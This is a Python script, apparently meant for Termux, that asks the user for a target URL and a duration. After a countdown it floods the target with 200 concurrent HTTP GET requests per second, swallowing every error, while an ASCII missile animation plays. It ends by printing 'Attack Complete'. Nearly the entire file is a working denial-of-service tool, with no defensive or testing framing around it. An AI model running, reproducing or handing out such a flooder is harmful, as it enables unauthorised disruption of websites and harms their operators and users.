import asyncio
import aiohttp
import random
import time
import os
import shutil

# Get terminal size for mobile
TERMINAL_SIZE = shutil.get_terminal_size((80, 40))
TERMINAL_WIDTH = TERMINAL_SIZE.columns
TERMINAL_HEIGHT = TERMINAL_SIZE.lines

# Terminal clear
def clear():
    print("\033[H\033[J", end="")  # ANSI clear for Termux

# Countdown loader
async def countdown_loader(seconds):
    for i in range(seconds, 0, -1):
        clear()
        print(f"SG - RELOADING | {i}s")
        await asyncio.sleep(1)

# Perfect missile body
MISSILE_BODY = [
"          /  \\",
"         |    |",
"         |    |",
"         |    |",
"         |    |",
"         |    |",
"         |    |",
"        /      \\",
"       |        |",
"       |        |",
"       |        |",
"       |        |",
"       |        |",
"       |        |",
"       |        |",
"      /|        |\\",
"     /_|________|_\\",
"        |      |",
"        |      |",
"        |      |",
"        '------'"
]

EXHAUST_FRAMES = ["   ^^   ", "   vv   ", "   **   ", "   ##   ", "   oo   "]

class Missile:
    def __init__(self):
        self.reset()

    def reset(self):
        self.x = random.randint(5, TERMINAL_WIDTH - 30)
        self.y = TERMINAL_HEIGHT  # start from bottom
        self.speed = random.choice([1,2,3])  # 1=avg, 2=fast, 3=ultra
        self.active = False
        self.launch_delay = random.uniform(0.5, 3.0)  # next missile launch delay
        self.exhaust = random.choice(EXHAUST_FRAMES)

    def move(self):
        if self.active:
            self.y -= self.speed
            if self.y < -len(MISSILE_BODY):
                self.reset()
                self.active = False

# Draw missiles
def draw_missiles(missiles):
    buffer = [""] * TERMINAL_HEIGHT
    for missile in missiles:
        if missile.active:
            for i, line in enumerate(MISSILE_BODY):
                pos = missile.y - len(MISSILE_BODY) + i
                if 0 <= pos < TERMINAL_HEIGHT:
                    buffer[pos] += " " * missile.x + line
            # Draw exhaust at bottom
            exhaust_pos = missile.y
            if 0 <= exhaust_pos < TERMINAL_HEIGHT:
                buffer[exhaust_pos] += " " * missile.x + random.choice(EXHAUST_FRAMES)
    clear()
    print("\n".join(buffer))

# HTTP request sender
async def send_requests(target, duration):
    semaphore = asyncio.Semaphore(200)
    end_time = time.time() + duration

    async def fetch(session):
        async with semaphore:
            try:
                async with session.get(target) as response:
                    await response.text()
            except:
                pass

    async with aiohttp.ClientSession() as session:
        while time.time() < end_time:
            tasks = [fetch(session) for _ in range(200)]
            await asyncio.gather(*tasks)
            await asyncio.sleep(1)

# Main function
async def main():
    target = input("¿TARGZ > ")
    duration = int(input("¿DU > "))

    await countdown_loader(30)

    missiles = [Missile() for _ in range(3)]  # mini swarm max 3

    # Start HTTP requests
    request_task = asyncio.create_task(send_requests(target, duration))

    start_time = time.time()
    last_launch_times = [0]*len(missiles)

    while time.time() - start_time < duration:
        now = time.time()
        for idx, missile in enumerate(missiles):
            # Launch missile based on delay and last launch
            if not missile.active and now - last_launch_times[idx] >= missile.launch_delay:
                missile.active = True
                last_launch_times[idx] = now
            missile.move()
        draw_missiles(missiles)
        await asyncio.sleep(0.1)

    await request_task
    print("=== TOS-1: Attack Complete ===")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        clear()
        print("TOS-1 terminated by user.")
